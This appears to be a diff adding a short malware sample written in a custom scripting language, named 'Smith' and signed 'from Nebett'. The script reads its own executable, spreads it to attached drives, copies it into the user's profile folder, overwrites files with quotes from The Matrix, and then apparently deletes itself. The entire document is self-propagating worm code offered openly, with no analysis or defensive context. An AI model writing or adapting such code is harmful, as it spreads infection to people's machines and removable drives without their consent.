@@ -1,0 +1,23 @@
+#SAMPLE
+
+name[Smith]
+version[alpha]
+
+#PIECES
+gui.messagebox["Hello","With love, from Nebett"][]
+
+file.read["neo.exe"][mfile,mfilesize]
+
+propagation.spamdrives["neo.exe",mfile,mfilesize][]
+
+sysvar.getenv["USERPROFILE"][usrvar]
+datamanip.catstr[usrvar,"\\neo.exe"][kidpath]
+file.writeptr[kidpath,mfile,mfilesize][]
+
+direct[sleep(42)][]
+
+file.writetxt["mhello.exe", "Somebody tell me. Why does it feel more real when I dream than when I am awake?, How can I know if my senses are lying?"][]
+
+file.writetxt["neo.exe", "There is some fiction in your truth, and some truth in your fiction. To know the truth, you must risk everything."][]
+
+routine.melting[][]
